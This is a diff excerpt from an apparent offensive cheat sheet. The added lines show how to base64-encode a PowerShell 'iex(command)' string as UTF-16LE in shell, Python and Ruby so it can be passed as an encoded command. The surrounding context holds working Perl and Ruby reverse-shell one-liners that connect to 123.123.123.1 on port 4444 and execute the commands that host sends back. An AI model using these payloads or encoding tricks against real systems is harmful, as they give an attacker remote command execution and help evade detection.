@@ -29,6 +29,16 @@ $ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)
 #Encoded to base64 if needed as a parameter etc.
 $Base64Enc =[Convert]::ToBase64String($ToBytes)
 
+!REMEMBER! make sure you use UTF16-LE, which for example Linux base64 does not do! (thanks to byt3bl33d3r!)
+#Commandline
+echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0
+#Python
+from base64 import b64encode
+b64encode('iex(command)'.encode('UTF-16LE'))
+#Ruby:
+require "base64"
+Base64.encode64('iex(command)'.force_encoding('UTF-16LE'))
+
 #Thanks to UB3RSEC
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
